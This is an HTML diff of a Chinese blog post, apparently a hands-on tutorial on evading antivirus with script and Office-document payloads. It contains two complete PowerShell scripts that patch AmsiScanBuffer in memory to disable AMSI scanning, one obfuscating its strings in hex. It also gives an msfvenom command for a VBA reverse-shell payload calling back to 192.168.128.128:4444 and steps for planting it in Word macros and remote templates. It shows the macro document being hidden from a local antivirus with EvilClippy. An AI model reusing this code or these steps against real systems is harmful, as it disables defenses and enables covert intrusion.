@@ -6,15 +6,44 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Archives: 2022 | Solkatt的小窝</title>
+  <title>文本类型的免杀 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/archives/2022/page/2/index.html">
+  <meta name="description" content="Powershell与Amsipowershell作为Windows系统内置工具， Powershell脚本的功能十分强大，同时作为系统的功能组件不会被常规杀毒引擎查杀。兼具这两个有点，Powershell的恶意利用程序得到快速发展，从2012年Powershell 攻击利用工具成型化以来，互联网中的通过无文件与Powershell的攻击事件数量逐年递增。无文件攻击在感染计算机时，不需写入磁盘即可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文本类型的免杀">
+<meta property="og:url" content="https://example.com/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="Powershell与Amsipowershell作为Windows系统内置工具， Powershell脚本的功能十分强大，同时作为系统的功能组件不会被常规杀毒引擎查杀。兼具这两个有点，Powershell的恶意利用程序得到快速发展，从2012年Powershell 攻击利用工具成型化以来，互联网中的通过无文件与Powershell的攻击事件数量逐年递增。无文件攻击在感染计算机时，不需写入磁盘即可">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620155020168.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620155916811.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/173bd87a05a04a7dbc264feb0f2c5001.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620170429969.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620170947320.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621003822263.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621010507321.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621010523304.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621010628542.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013328744.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013533522.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013628908.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013644061.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621015233032.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621015614361.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621151409488.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621151535780.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621151648273.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621152600812.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621152727480.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621153845953.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621160201490.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621160439809.png">
+<meta property="article:published_time" content="2022-06-20T07:09:38.000Z">
+<meta property="article:modified_time" content="2022-06-21T08:07:15.264Z">
 <meta property="article:author" content="Solkatt">
+<meta property="article:tag" content="萌新免杀的故事">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620155020168.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,36 +171,110 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-文本类型的免杀" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-03-21T08:20:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-21</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/">shellcode的基础免杀</a>
+    <h1 class="article-title" itemprop="name">
+      文本类型的免杀
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/" class="archive-article-date">
+  	<time datetime="2022-06-20T07:09:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Powershell与Amsi"><a href="#Powershell与Amsi" class="headerlink" title="Powershell与Amsi"></a>Powershell与Amsi</h1><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>作为Windows系统内置工具， Powershell脚本的功能十分强大，同时作为系统的功能组件不会被常规杀毒引擎查杀。兼具这两个有点，Powershell的恶意利用程序得到快速发展，从2012年Powershell 攻击利用工具成型化以来，互联网中的通过无文件与Powershell的攻击事件数量逐年递增。无文件攻击在感染计算机时，不需写入磁盘即可从事恶意活动，绕过那些基于签名和文件检测的传统安全软件。 如何检测这些恶意行为成了安全厂商和企业用户与个人更为关心的问题。微软在2015年中旬开始提出了针对无文件攻击和Powershell脚本攻击的检测缓解方案-AMSI。</p>
+<span id="more"></span>
+
+<h2 id="amsi"><a href="#amsi" class="headerlink" title="amsi"></a>amsi</h2><p>AMSI（Antimalware Scan Interface）， 即反恶意软件扫描<strong>接口</strong>。它的流程在于扫描-触发-病毒库。amsi主要的目的是分析文本类的恶意代码。</p>
+<p>接入该接口的厂商有以下：<a target="_blank" rel="noopener" href="https://github.com/subat0mik/whoamsi/">https://github.com/subat0mik/whoamsi/</a></p>
+<p>（ps：国内杀软都没有接入amsi，amsi一般只跟defender相关）</p>
+<p>原理：正则匹配。</p>
+<p>以下是被amsi阻拦的内容示例：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620155020168.png" alt="image-20220620155020168"></p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>各种编码 base64 hex ascii</p>
+<h4 id="降低版本"><a href="#降低版本" class="headerlink" title="降低版本"></a>降低版本</h4><p>低版本的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到。</p>
+<p>以下是预装在windows系统中的powershell</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620155916811.png" alt="image-20220620155916811"></p>
+<p>但是该方法一般不好运用，因为一般平常没人会在电脑里装一些c的运行库用来运行powershell低版本。</p>
+<h4 id="长度清零"><a href="#长度清零" class="headerlink" title="长度清零"></a>长度清零</h4><p>在amsi.dll这个文件里面有一个叫做<code>amsiscanbuffer</code>的函数。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/173bd87a05a04a7dbc264feb0f2c5001.png" alt="img"></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">AmsiScanBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PVOID        buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG        length,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCWSTR      contentName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          AMSI_RESULT  *result</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">[in] amsiContext</span><br><span class="line">最初从 AmsiInitialize 收到的HMSICONTEXT类型的句柄。</span><br><span class="line">[in] buffer</span><br><span class="line">从中读取要扫描的数据的缓冲区。</span><br><span class="line">[in] length</span><br><span class="line">要从缓冲区读取的数据的长度（以字节为单位） 。</span><br><span class="line">[in] contentName</span><br><span class="line">正在扫描的内容的文件名、URL、唯一脚本 ID 或类似内容。</span><br><span class="line">[in, optional] amsiSession</span><br><span class="line">如果要在一个会话中关联多个扫描请求，请将session设置为最初从AmsiOpenSession接收的 HAMSISESSION 类型的句柄。否则，将session设置为<span class="literal">nullptr</span>。</span><br><span class="line">[out] result</span><br><span class="line">扫描结果。请参阅AMSI_RESULT。</span><br><span class="line">应用应使用AmsiResultIsMalware来确定是否应阻止内容。</span><br><span class="line">返回值</span><br><span class="line">如果此函数成功，则返回S_OK。否则，它会返回HRESULT错误代码。</span><br></pre></td></tr></table></figure>
+
+<p>长度清零的原理就是把length参数的字段清一个0，每一次扫的内容长度是0，自然也就等于没扫了，也就是绕过了amsi。</p>
+<p>脚本如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Kernel32</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Kernel32 &#123;</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr LoadLibrary(string lpLibFileName);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$Kernel32</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Hunter</span></span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function">[<span class="built_in">Int</span><span class="type">Ptr</span>] <span class="title">FindAddress</span></span>([<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="variable">$address</span>, [<span class="built_in">byte</span>[]]<span class="variable">$egg</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</span><br><span class="line">            [<span class="built_in">int</span>]<span class="variable">$count</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</span><br><span class="line">                [<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="variable">$address</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Add(<span class="variable">$address</span>, <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">If</span> ([<span class="type">System.Runtime.InteropServices.Marshal</span>]::ReadByte(<span class="variable">$address</span>) <span class="operator">-eq</span> <span class="variable">$egg</span>.Get(<span class="variable">$count</span>)) &#123;</span><br><span class="line">                    <span class="variable">$count</span>++</span><br><span class="line">                    <span class="keyword">If</span> (<span class="variable">$count</span> <span class="operator">-eq</span> <span class="variable">$egg</span>.Length) &#123;</span><br><span class="line">                        <span class="keyword">return</span> [<span class="built_in">Int</span><span class="type">Ptr</span>]::Subtract(<span class="variable">$address</span>, <span class="variable">$egg</span>.Length - <span class="number">1</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">Else</span> &#123; <span class="keyword">break</span> &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="variable">$hModule</span> = [<span class="type">Kernel32</span>]::LoadLibrary(<span class="string">&quot;amsi.dll&quot;</span>)</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] AMSI DLL Handle: <span class="variable">$hModule</span>&quot;</span></span><br><span class="line"></span><br><span class="line">[<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="variable">$dllCanUnloadNowAddress</span> = [<span class="type">Kernel32</span>]::GetProcAddress(<span class="variable">$hModule</span>, <span class="string">&quot;DllCanUnloadNow&quot;</span>)</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] DllCanUnloadNow address: <span class="variable">$dllCanUnloadNowAddress</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::Size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">Write-Host</span> <span class="string">&quot;[+] 64-bits process&quot;</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$egg</span> = [<span class="built_in">byte</span>[]] (</span><br><span class="line">        <span class="number">0</span>x4C, <span class="number">0</span>x8B, <span class="number">0</span>xDC,       <span class="comment"># mov     r11,rsp</span></span><br><span class="line">        <span class="number">0</span>x49, <span class="number">0</span>x89, <span class="number">0</span>x5B, <span class="number">0</span>x08, <span class="comment"># mov     qword ptr [r11+8],rbx</span></span><br><span class="line">        <span class="number">0</span>x49, <span class="number">0</span>x89, <span class="number">0</span>x6B, <span class="number">0</span>x10, <span class="comment"># mov     qword ptr [r11+10h],rbp</span></span><br><span class="line">        <span class="number">0</span>x49, <span class="number">0</span>x89, <span class="number">0</span>x73, <span class="number">0</span>x18, <span class="comment"># mov     qword ptr [r11+18h],rsi</span></span><br><span class="line">        <span class="number">0</span>x57,                   <span class="comment"># push    rdi</span></span><br><span class="line">        <span class="number">0</span>x41, <span class="number">0</span>x56,             <span class="comment"># push    r14</span></span><br><span class="line">        <span class="number">0</span>x41, <span class="number">0</span>x57,             <span class="comment"># push    r15</span></span><br><span class="line">        <span class="number">0</span>x48, <span class="number">0</span>x83, <span class="number">0</span>xEC, <span class="number">0</span>x70  <span class="comment"># sub     rsp,70h</span></span><br><span class="line">    )</span><br><span class="line">&#125; <span class="keyword">Else</span> &#123;</span><br><span class="line">	<span class="built_in">Write-Host</span> <span class="string">&quot;[+] 32-bits process&quot;</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$egg</span> = [<span class="built_in">byte</span>[]] (</span><br><span class="line">        <span class="number">0</span>x8B, <span class="number">0</span>xFF,             <span class="comment"># mov     edi,edi</span></span><br><span class="line">        <span class="number">0</span>x55,                   <span class="comment"># push    ebp</span></span><br><span class="line">        <span class="number">0</span>x8B, <span class="number">0</span>xEC,             <span class="comment"># mov     ebp,esp</span></span><br><span class="line">        <span class="number">0</span>x83, <span class="number">0</span>xEC, <span class="number">0</span>x18,       <span class="comment"># sub     esp,18h</span></span><br><span class="line">        <span class="number">0</span>x53,                   <span class="comment"># push    ebx</span></span><br><span class="line">        <span class="number">0</span>x56                    <span class="comment"># push    esi</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">[<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="variable">$targetedAddress</span> = [<span class="type">Hunter</span>]::FindAddress(<span class="variable">$dllCanUnloadNowAddress</span>, <span class="variable">$egg</span>)</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] Targeted address: <span class="variable">$targetedAddress</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$oldProtectionBuffer</span> = <span class="number">0</span></span><br><span class="line">[<span class="type">Kernel32</span>]::VirtualProtect(<span class="variable">$targetedAddress</span>, [<span class="type">uint32</span>]<span class="number">2</span>, <span class="number">4</span>, [<span class="type">ref</span>]<span class="variable">$oldProtectionBuffer</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$patch</span> = [<span class="built_in">byte</span>[]] (</span><br><span class="line">    <span class="number">0</span>x31, <span class="number">0</span>xC0,    <span class="comment"># xor rax, rax</span></span><br><span class="line">    <span class="number">0</span>xC3           <span class="comment"># ret  </span></span><br><span class="line">)</span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$patch</span>, <span class="number">0</span>, <span class="variable">$targetedAddress</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">0</span></span><br><span class="line">[<span class="type">Kernel32</span>]::VirtualProtect(<span class="variable">$targetedAddress</span>, [<span class="type">uint32</span>]<span class="number">2</span>, <span class="variable">$oldProtectionBuffer</span>, [<span class="type">ref</span>]<span class="variable">$a</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">```</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>复现如下：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620170429969.png" alt="image-20220620170429969"></p>
+<p>在运行该脚本后</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220620170947320.png" alt="image-20220620170947320"></p>
+<h4 id="改变调查结果"><a href="#改变调查结果" class="headerlink" title="改变调查结果"></a>改变调查结果</h4><p>它的原理是让每次amsi回来的结果都是false，这也可以绕过amsi。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Win32</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Win32 &#123;</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$Win32</span></span><br><span class="line"><span class="variable">$test</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x61, <span class="number">0</span>x6d, <span class="number">0</span>x73, <span class="number">0</span>x69, <span class="number">0</span>x2e, <span class="number">0</span>x64, <span class="number">0</span>x6c, <span class="number">0</span>x6c)</span><br><span class="line"><span class="variable">$LoadLibrary</span> = [<span class="type">Win32</span>]::LoadLibrary([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$test</span>))</span><br><span class="line"><span class="variable">$test2</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x41, <span class="number">0</span>x6d, <span class="number">0</span>x73, <span class="number">0</span>x69, <span class="number">0</span>x53, <span class="number">0</span>x63, <span class="number">0</span>x61, <span class="number">0</span>x6e, <span class="number">0</span>x42, <span class="number">0</span>x75, <span class="number">0</span>x66, <span class="number">0</span>x66, <span class="number">0</span>x65, <span class="number">0</span>x72)</span><br><span class="line"><span class="variable">$Address</span> = [<span class="type">Win32</span>]::GetProcAddress(<span class="variable">$LoadLibrary</span>, [<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$test2</span>))</span><br><span class="line"><span class="variable">$p</span> = <span class="number">0</span></span><br><span class="line">[<span class="type">Win32</span>]::VirtualProtect(<span class="variable">$Address</span>, [<span class="type">uint32</span>]<span class="number">5</span>, <span class="number">0</span>x40, [<span class="type">ref</span>]<span class="variable">$p</span>)</span><br><span class="line"><span class="variable">$Patch</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x31, <span class="number">0</span>xC0, <span class="number">0</span>x05, <span class="number">0</span>x78, <span class="number">0</span>x01, <span class="number">0</span>x19, <span class="number">0</span>x7F, <span class="number">0</span>x05, <span class="number">0</span>xDF, <span class="number">0</span>xFE, <span class="number">0</span>xED, <span class="number">0</span>x00, <span class="number">0</span>xC3)</span><br><span class="line"><span class="comment">#0:  31 c0                   xor    eax,eax</span></span><br><span class="line"><span class="comment">#2:  05 78 01 19 7f          add    eax,0x7f190178</span></span><br><span class="line"><span class="comment">#7:  05 df fe ed 00          add    eax,0xedfedf</span></span><br><span class="line"><span class="comment">#c:  c3                      ret </span></span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$Patch</span>, <span class="number">0</span>, <span class="variable">$Address</span>, <span class="variable">$Patch</span>.Length)</span><br></pre></td></tr></table></figure>
+
+<p>案例使用如下：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621003822263.png" alt="image-20220621003822263"></p>
+<h1 id="宏与office"><a href="#宏与office" class="headerlink" title="宏与office"></a>宏与office</h1><h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h2><p>宏其实就是vba编写的脚本文件。它可以运行在office文件中。但是现在微软官方已经不更新vb了。</p>
+<h3 id="案例1："><a href="#案例1：" class="headerlink" title="案例1："></a>案例1：</h3><p>首先在msf中生成一个宏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.128.128 lport=4444 -f vba   </span><br></pre></td></tr></table></figure>
+
+<p>接着我们去创建一个word文件，在视图——&gt;宏中去录制一个新的宏（将宏保存在新建的文档），将msf生成的vba脚本粘贴到宏中去，随后另存为一个新的docm文档。点击新的docm文档，之后选择启用宏，便可以上线msf。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621010507321.png" alt="image-20220621010507321"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621010523304.png" alt="image-20220621010523304"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621010628542.png" alt="image-20220621010628542"></p>
+<p>当然这个东西是不免杀的，可以尝试通过编码等方式去免杀。</p>
+<p>也可以使用工具evilclipy。它的功能就是对文件进行二次压缩。使用正常的vba去掩盖恶意vba。</p>
+<h3 id="案例2："><a href="#案例2：" class="headerlink" title="案例2："></a>案例2：</h3><p>首先去github上clone下来，之后使用vs在本地编译该exe。编译结果如下：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013328744.png" alt="image-20220621013328744"></p>
+<p>接下来去网上随便找一个符合格式的vba文件，再使用刚才的恶意docm文件。再路径下进行编译</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013533522.png" alt="image-20220621013533522"></p>
+<p>点击后打开启用宏，仍然msf上线，且本地火绒扫秒该文件不报毒</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013628908.png" alt="image-20220621013628908"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621013644061.png" alt="image-20220621013644061"></p>
+<h2 id="远程模板加载"><a href="#远程模板加载" class="headerlink" title="远程模板加载"></a>远程模板加载</h2><p>远程模板加载就是word文档去加载远程的宏的意思。并没有变得很高大。</p>
+<h3 id="案列："><a href="#案列：" class="headerlink" title="案列："></a>案列：</h3><p>在录制宏的时候，将宏保存在所在文档。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621015233032.png" alt="image-20220621015233032"></p>
+<p>仍然将msf放入宏文件。并将该文档保存为dotm文件。</p>
+<img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621015614361.png" alt="image-20220621015614361" style="zoom:150%;" />
+
+<p>然后把该dotm文件放到远程vps上。这里我直接放到kali上的。使用python开启http服务。</p>
+<p>在物理机上新建一个docx文件（注意选择从模板加载），将它改成rar文件后缀，之后解压。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621151409488.png" alt="image-20220621151409488"></p>
+<p>在word-&gt;_Rels -&gt;settings.xml.rels里面修改以下字段位置</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621151535780.png" alt="image-20220621151535780"></p>
+<p>把target字段修改成HTTP协议，之后访问vps上的模板文件。</p>
